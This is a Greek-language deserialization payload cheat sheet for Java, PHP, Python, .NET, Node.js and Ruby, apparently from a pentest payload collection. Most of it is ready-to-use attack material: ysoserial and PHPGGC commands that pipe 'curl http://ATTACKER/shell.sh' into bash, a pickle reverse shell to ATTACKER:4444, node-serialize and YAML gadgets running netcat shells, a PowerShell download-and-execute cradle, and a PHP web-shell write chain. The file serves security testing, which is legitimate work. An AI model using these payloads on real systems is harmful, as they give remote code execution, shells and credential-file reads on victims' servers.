# 🔓 Δοκιμαστικές είσοδοι αποσειριοποίησης

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../Deserialization.md) • [🇹🇷 Türkçe Sürüm](Deserialization.tr.md)

```
██████╗ ███████╗███████╗███████╗██████╗ ██╗ █████╗ ██╗     ██╗███████╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║     ██║╚══███╔╝██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
██║  ██║█████╗  ███████╗█████╗  ██████╔╝██║███████║██║     ██║  ███╔╝ ███████║   ██║   ██║██║   ██║██╔██╗ ██║
██║  ██║██╔══╝  ╚════██║██╔══╝  ██╔══██╗██║██╔══██║██║     ██║ ███╔╝  ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
██████╔╝███████╗███████║███████╗██║  ██║██║██║  ██║███████╗██║███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## Πριν ξεκινήσετε

Η **σειριοποίηση** μετατρέπει δεδομένα ή αντικείμενα σε μορφή αποθήκευσης/μεταφοράς. Η **αποσειριοποίηση** τα ανακατασκευάζει. Ο κίνδυνος εμφανίζεται όταν μη έμπιστα δεδομένα ενεργοποιούν ανεπιθύμητες λειτουργίες ή κώδικα κατά αυτή τη διαδικασία.

**Gadget** είναι υπάρχον τμήμα κώδικα που μπορεί να συμμετέχει σε ανεπιθύμητη ακολουθία και **gadget chain** μια τέτοια αλυσίδα. Τα χαρακτηριστικά αρχικά bytes υποδεικνύουν μορφή, όχι ευπάθεια. Απαιτούνται συμβατές βιβλιοθήκες, κλάσεις και ρυθμίσεις. Μην φορτώνετε τα δείγματα ως έμπιστα δεδομένα για να τα εξετάσετε.

<a id="section-01"></a>

## ☕ Αποσειριοποίηση Java

### Ανίχνευση
```
# Χαρακτηριστικά αρχικά bytes
AC ED 00 05    # Σειριοποιημένο αντικείμενο Java — Base64: rO0AB
H4sIAAAA       # Συμπίεση GZip

# Συνήθη σημεία εμφάνισης
- Cookies με κωδικοποίηση Base64
- Κρυφά πεδία φορμών
- ViewState
- Παράμετροι API
- RMI στη θύρα 1099
- JMX στη θύρα 9010
```

### ysoserial — δημιουργία δοκιμαστικών αντικειμένων
```bash
# Παράδειγμα εγκατάστασης
git clone https://github.com/frohoff/ysoserial.git
cd ysoserial && mvn package

# Δημιουργία δοκιμαστικού αντικειμένου
java -jar ysoserial.jar CommonsCollections1 "whoami" | base64
java -jar ysoserial.jar CommonsCollections5 "curl http://ATTACKER/shell.sh | bash"
java -jar ysoserial.jar CommonsCollections6 "ping -c 3 ATTACKER"

# Συνήθεις αλυσίδες gadget
CommonsCollections1-7
CommonsCollectionsBeanutils
Jdk7u21
Spring1
Hibernate1
Groovy1
```

### Δοκιμαστικό αντικείμενο για αλληλεπίδραση DNS
```bash
# Δημιουργία αντικειμένου για callback DNS
java -jar ysoserial.jar URLDNS "http://BURP_COLLAB" | base64

# Ανίχνευση με DNS
java -jar ysoserial.jar JRMPClient "ATTACKER:1099"
```

### Βιβλιοθήκες που εμφανίζονται σε σχετικά παραδείγματα
```
commons-collections:3.1-4.0
commons-beanutils
spring-beans
hibernate
```

---

<a id="section-02"></a>

## 🐘 Αποσειριοποίηση PHP

> **Μήκη και κλάσεις:** Τα serialized strings απαιτούν ακριβή μήκη bytes και πλήθος ιδιοτήτων. Ορισμένα αρχικά παραδείγματα POP περιέχουν ασυμφωνίες και δεν είναι έτοιμα έγκυρα serialized αντικείμενα. Η αλυσίδα προϋποθέτει τις κατάλληλες κλάσεις στην εφαρμογή.


### Magic methods — ειδικές μέθοδοι PHP
```php
__construct()    // Δημιουργία αντικειμένου
__destruct()     // Καταστροφή αντικειμένου
__wakeup()       // Αποσειριοποίηση
__sleep()        // Σειριοποίηση
__toString()     // Μετατροπή αντικειμένου σε συμβολοσειρά
__call()         // Μη προσβάσιμη μέθοδος
__get()          // Ανάγνωση μη προσβάσιμης ιδιότητας
__set()          // Εγγραφή μη προσβάσιμης ιδιότητας
```

### Βασική δοκιμαστική είσοδος
```php
// Μορφή σειριοποιημένου αντικειμένου
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}

// Αντικείμενο με ιδιότητες
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}

// Πίνακας
a:2:{i:0;s:5:"hello";i:1;s:5:"world";}
```

### Ασθενείς συγκρίσεις και μετατροπές τύπων
```php
// Παράδειγμα σύγκρισης με λογικό true
O:4:"User":1:{s:8:"password";b:1;}

// Σύγκριση με ακέραιο 0
O:4:"User":1:{s:8:"password";i:0;}

// Παράδειγμα σύγκρισης με πίνακα
O:4:"User":1:{s:8:"password";a:0:{}}
```

### Παραδείγματα αλυσίδων POP
```php
// Εγγραφή αυθαίρετου αρχείου
O:8:"LogClass":1:{s:4:"file";s:11:"/tmp/shell.php";s:7:"content";s:30:"<?php system($_GET['cmd']); ?>";}

// Εκτέλεση εντολής μέσω __destruct()
O:10:"SystemExec":1:{s:3:"cmd";s:2:"id";}
```

### PHPGGC — αλυσίδες gadget PHP
```bash
# Παράδειγμα εγκατάστασης
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Λίστα διαθέσιμων gadgets
./phpggc -l

# Δημιουργία δοκιμαστικού αντικειμένου
./phpggc Laravel/RCE1 system id
./phpggc Symfony/RCE4 exec "id"
./phpggc Monolog/RCE1 exec "whoami"
./phpggc Guzzle/RCE1 system "cat /etc/passwd"

# Κωδικοποίηση Base64
./phpggc -b Laravel/RCE1 system "id"

# Κωδικοποίηση URL
./phpggc -u Laravel/RCE1 system "id"

# Με περιτύλιγμα PHAR
./phpggc -p phar Laravel/RCE1 system id -o exploit.phar
```

### Αποσειριοποίηση μέσω Phar

> **Μεταβολή έκδοσης:** Από PHP 8 η ανάγνωση metadata Phar δεν γίνεται αυτόματα με κάθε πρόσβαση μέσω stream wrapper. Ο γενικός ισχυρισμός του πρωτοτύπου χρειάζεται περιορισμό ανά έκδοση και API. Δείτε τις [ασύμβατες αλλαγές PHP 8](https://www.php.net/manual/en/migration80.incompatible.php).

```php
// Η συμπεριφορά αποσειριοποίησης Phar εξαρτάται από έκδοση και τρόπο πρόσβασης
phar://path/to/phar.phar/internal-file

// Παραδείγματα πρόσβασης μέσω phar://
file_get_contents("phar://...")
file_exists("phar://...")
include("phar://...")
fopen("phar://...")
```

---

<a id="section-03"></a>

## 🐍 Αποσειριοποίηση Python με Pickle

### Βασική δοκιμαστική είσοδος
```python
import pickle
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(RCE())
print(payload.hex())
```

### Παράδειγμα αντίστροφης σύνδεσης κελύφους
```python
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

### Ανίχνευση
```
# Χαρακτηριστικά αρχικά bytes
80 04 95    # Πρωτόκολλο 4 — Python 3
80 03       # Πρωτόκολλο 3
80 02       # Πρωτόκολλο 2

# Συνήθη μοτίβα Base64
gASV        # Πρωτόκολλο 4
gAN         # Πρωτόκολλο 3
```

### Αποσειριοποίηση YAML στην Python
```yaml
# Μη ασφαλής φόρτωση PyYAML
!!python/object/apply:os.system ["id"]
!!python/object/new:os.system ["id"]
!!python/object/apply:subprocess.check_output [["id"]]

# Πολλαπλές εντολές
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - /bin/bash
  - -c
  - "curl http://ATTACKER/shell.sh | bash"
```

---

<a id="section-04"></a>

## 🔷 .NET — αποσειριοποίηση

> **Πρόσθετες προϋποθέσεις:** ViewState, BinaryFormatter και JSON.NET είναι διαφορετικοί μηχανισμοί. Ένα πεδίο type ή μια χαρακτηριστική αρχή Base64 δεν επιβεβαιώνει εκμεταλλεύσιμη αποσειριοποίηση. Για ViewState υπάρχουν επιπλέον απαιτήσεις προστασίας και κλειδιών.


### Ανίχνευση
```
# ViewState
Παράμετρος __VIEWSTATE με κωδικοποίηση Base64

# BinaryFormatter
AAEAAAD/////    # Χαρακτηριστική αρχή Base64

# JSON.NET
Πεδίο $type μέσα σε JSON
```

### ysoserial.net — δημιουργία δοκιμαστικών αντικειμένων
```powershell
# Λήψη
# https://github.com/pwntester/ysoserial.net

# Δημιουργία δοκιμαστικού αντικειμένου
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "calc.exe" -o base64

# Συνήθη gadgets
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c whoami"
ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter -c "powershell IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"

# Παράδειγμα ελέγχου ViewState
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd.exe /c ping ATTACKER" --path="/test.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY"
```

### JSON.NET TypeNameHandling
```json
{
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System"
    },
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList",
        "$values": ["cmd.exe", "/c calc.exe"]
    }
}
```

---

<a id="section-05"></a>

## 🟨 JavaScript/Node.js

### node-serialize
```javascript
// Ευάλωτη χρήση: unserialize(user_input)
// Δοκιμαστικό αντικείμενο με IIFE — έκφραση συνάρτησης που καλείται αμέσως
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}

// Αντίστροφη σύνδεση κελύφους
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nc -e /bin/sh ATTACKER 4444')}()"}
```

### serialize-javascript
```javascript
// Αν χρησιμοποιείται eval() σε αποσειριοποιημένα δεδομένα
(function(){require('child_process').execSync('id')})()
```

---

<a id="section-06"></a>

## 🔴 Αποσειριοποίηση Ruby

### Marshal.load
```ruby
# Δημιουργία δοκιμαστικού αντικειμένου
require 'base64'
code = "system('id')"
payload = "\x04\x08o:\x15Gem::Requirement\x06:\x10@requirements[\x06o:\x18Gem::Package::TarReader\x06:\x09@ioo:\x15Gem::Package::TarReader::Entry\x06:\x0A@headI\"\x00#{code}\x06:\x06ET"
puts Base64.encode64(payload)
```

### YAML.load (Psych)
```yaml
--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::Package::TarReader
  io: &1 !ruby/object:Net::BufferedIO
    io: &1 !ruby/object:Gem::Package::TarReader::Entry
       read: 0
       header: "abc"
    debug_output: &1 !ruby/object:Net::WriteAdapter
       socket: &1 !ruby/object:Gem::RequestSet
           sets: !ruby/object:Net::WriteAdapter
               socket: !ruby/module 'Kernel'
               method_id: :system
           git_set: id
       method_id: :resolve
```

---

<a id="section-07"></a>

## 📋 Λίστα ελέγχου

```markdown
□ Αναγνώριση μορφής σειριοποίησης: Base64, hex και χαρακτηριστικά bytes
□ Προσδιορισμός γλώσσας και framework: Java, PHP, Python, .NET
□ Έλεγχος εκδόσεων βιβλιοθηκών
□ Δημιουργία δοκιμαστικών αντικειμένων με κατάλληλο εργαλείο
□ Τυφλός έλεγχος με callbacks DNS/HTTP
□ Έλεγχος δυνατότητας ανάγνωσης και εγγραφής αρχείων
□ Έλεγχος δυνατότητας εκτέλεσης κώδικα
□ Αξιολόγηση διαφορετικών αλυσίδων gadget
□ Έλεγχος συμπεριφοράς φίλτρων με κωδικοποίηση και συμπίεση
```

---

<a id="section-08"></a>

## 🔗 Συνοπτικός πίνακας εργαλείων

| Γλώσσα προγραμματισμού | Εργαλείο | Χρήση |
| ---------- | ------ | ------- |
| **Java** | ysoserial | `java -jar ysoserial.jar GADGET "cmd"` |
| **PHP** | PHPGGC | `./phpggc GADGET system "cmd"` |
| **Python** | Custom — προσαρμοσμένος έλεγχος | `pickle.dumps(Exploit())` |
| **.NET** | ysoserial.net | `ysoserial.exe -g GADGET -f FORMAT -c "cmd"` |
| **Ruby** | Custom — προσαρμοσμένος έλεγχος | Χειροκίνητη δημιουργία δοκιμαστικού αντικειμένου |

---

<a id="section-09"></a>

## 🔗 Σχετικές συλλογές δοκιμαστικών εισόδων

- [Δοκιμαστικές είσοδοι SSTI](SSTI.el.md)
- [Εισαγωγή εντολών λειτουργικού συστήματος](Command-Injection.el.md)

---

**Επιστροφή στη συλλογή:** [💉 Συλλογή δοκιμαστικών εισόδων στην ελληνική αρχική σελίδα](../../README.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
